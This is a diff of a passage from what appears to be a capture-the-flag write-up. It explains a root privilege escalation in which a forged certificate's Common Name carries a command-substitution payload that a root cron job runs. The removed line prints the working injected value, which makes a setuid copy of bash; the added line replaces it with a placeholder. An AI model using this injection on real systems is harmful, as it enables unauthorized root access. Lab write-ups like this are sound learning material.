@@ -177,7 +177,7 @@ So you forge a certificate whose Common Name is not a name but a command, set to
 bill@broscience:~$ openssl req -x509 -nodes -newkey rsa:2048 \
     -keyout /dev/null -out Certs/iceberg.crt -days 1
 # at the CN prompt, instead of a hostname:
-Common Name: $(cp /bin/bash /tmp/iceberg; chmod 4777 /tmp/iceberg)
+Common Name: $( [ cp /bin/bash to /tmp/iceberg and chmod it setuid-root ] )
 ```
 
 When the cron fires, root parses your certificate, expands the `$(...)` in the CN, and runs it as root. The payload copies `bash` to `/tmp` and flips on the SUID bit, which means the copy keeps root's identity no matter who runs it. Wait two minutes, then claim it.
